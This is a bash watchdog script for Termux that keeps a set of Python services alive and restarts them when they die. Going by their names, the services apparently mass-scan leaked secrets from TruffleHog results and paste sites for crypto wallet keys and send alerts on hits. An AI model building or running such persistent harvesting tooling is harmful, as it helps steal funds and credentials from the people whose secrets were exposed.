#!/data/data/com.termux/files/usr/bin/bash
# perpetual_watchdog — master daemon that keeps ALL services alive forever.
# Checks PID files AND pgrep.  Cleans stale PIDs.  Restarts anything dead.
# Immune to pkill, terminal close, crashes.  Run once, never touch again.
set +e
HOME_DIR="${HOME:-/data/data/com.termux/files/home}"
PID_DIR="$HOME_DIR/.run_pids"
LOG="$HOME_DIR/perpetual_watchdog.log"
mkdir -p "$PID_DIR"

exec >>"$LOG" 2>&1

echo "============================================"
echo "[PERPETUAL] Master watchdog started $(date)"
echo "[PERPETUAL] PID: $$"

# ── Helpers ──────────────────────────────────────────────────────

_alive_pidfile() {
    local f="$1"
    [ -f "$f" ] || return 1
    local p
    p=$(tr -d ' \r\n' <"$f" 2>/dev/null)
    [ -n "$p" ] && kill -0 "$p" 2>/dev/null
}

_clean_stale_pidfile() {
    local f="$1"
    if [ -f "$f" ]; then
        local p
        p=$(tr -d ' \r\n' <"$f" 2>/dev/null)
        if [ -n "$p" ] && ! kill -0 "$p" 2>/dev/null; then
            rm -f "$f"
            echo "[PERPETUAL] 🧹 cleaned stale PID file $f (pid $p dead)" >>"$LOG"
        fi
    fi
}

_pgrep_alive() {
    pgrep -f "$1" >/dev/null 2>&1
}

_spawn() {
    local pidf="$1" logf="$2"; shift 2
    local envparts=()
    while [ "$#" -gt 0 ] && [ "$1" != "--" ]; do
        envparts+=("$1"); shift
    done
    [ "$1" = "--" ] && shift
    if [ "${#envparts[@]}" -gt 0 ]; then
        nohup setsid env "${envparts[@]}" "$@" >>"$logf" 2>&1 </dev/null &
    else
        nohup setsid "$@" >>"$logf" 2>&1 </dev/null &
    fi
    echo $! > "$pidf"
    echo "[PERPETUAL] spawned $* → pid $(cat "$pidf")" >>"$LOG"
}

# Check: PID file first, then pgrep fallback
_is_alive() {
    local pidf="$1" pgrep_pat="$2"
    if _alive_pidfile "$pidf"; then
        return 0
    fi
    if [ -f "$pidf" ]; then
        _clean_stale_pidfile "$pidf"
    fi
    _pgrep_alive "$pgrep_pat"
}

# ── Service definitions ──────────────────────────────────────────

declare -A RESTART_COUNT

_ensure() {
    local name="$1" pidf="$2" logf="$3" pgrep_pat="$4"; shift 4
    if ! _is_alive "$pidf" "$pgrep_pat"; then
        RESTART_COUNT["$name"]=$((RESTART_COUNT["$name"] + 1))
        local n=${RESTART_COUNT["$name"]}
        echo "[PERPETUAL] #$n $name dead — restarting..."
        _spawn "$pidf" "$logf" -- "$@"
        sleep 2
        if _is_alive "$pidf" "$pgrep_pat"; then
            echo "[PERPETUAL] #$n $name RESTORED ✓"
        else
            echo "[PERPETUAL] #$n $name FAILED to start ⚠"
        fi
    fi
}

# ── Main loop ───────────────────────────────────────────────────
CHECK_INTERVAL=10

while true; do
    # Clean ALL stale PID files first — don't leave corpses
    for f in "$PID_DIR"/*.pid; do
        [ -f "$f" ] && _clean_stale_pidfile "$f"
    done

    # Every service: name, PID file, log, pgrep pattern, start cmd
    _ensure "keepalive"       "$PID_DIR/keepalive.pid"       "$HOME_DIR/keepalive.log"       "keepalive.py"                python3 "$HOME_DIR/keepalive.py"
    _ensure "crypto_scanner"  "$PID_DIR/crypto_scanner.pid"  "$HOME_DIR/crypto_scanner_scanner.log" "crypto_scanner.py"   python3 "$HOME_DIR/crypto_scanner.py" "$HOME_DIR/.trufflehog_mass_results.jsonl"
    _ensure "adaptive_scan"   "$PID_DIR/adaptive_scan.pid"   "$HOME_DIR/adaptive_scan.log"   "adaptive_throttler.py"       python3 "$HOME_DIR/adaptive_throttler.py"
    _ensure "paste_watcher"   "$PID_DIR/paste_watcher.pid"   "$HOME_DIR/paste_watcher.log"   "paste_box_watcher.py"        python3 "$HOME_DIR/paste_box_watcher.py"
    _ensure "walletx_server"  "$PID_DIR/walletx_server.pid"  "$HOME_DIR/walletx_server.log"  "walletx_server.py"           python3 "$HOME_DIR/walletx_server.py"
    _ensure "notify_hits"     "$PID_DIR/notify_hits.pid"     "$HOME_DIR/notify_hits.log"     "notify_hits.py"              python3 "$HOME_DIR/notify_hits.py"
    _ensure "deobfuscator"    "$PID_DIR/deobfuscation_daemon.pid" "$HOME_DIR/deobfuscation_daemon.log" "deobfuscation_daemon.py" python3 "$HOME_DIR/deobfuscation_daemon.py"
    _ensure "powo_scanner"    "$PID_DIR/powo_scanner.pid"    "$HOME_DIR/powo_scanner.log"    "PoWo-dinosaurs_abandon_wealth.py" python3 "$HOME_DIR/PoWo-dinosaurs_abandon_wealth.py"
    _ensure "stack_watchdog"  "$PID_DIR/stack_watchdog.pid"  "$HOME_DIR/watchdog.log"        "stack_watchdog.sh"           bash "$HOME_DIR/stack_watchdog.sh"

    # Auto-decrypt is optional
    if [ -f "$HOME_DIR/auto_decrypt.py" ] && [ -f "$HOME_DIR/.encrypt_passphrase" ]; then
        _pgrep_alive "auto_decrypt.py" || python3 "$HOME_DIR/auto_decrypt.py" >>"$HOME_DIR/auto_decrypt.log" 2>&1 &
    fi

    sleep $CHECK_INTERVAL
done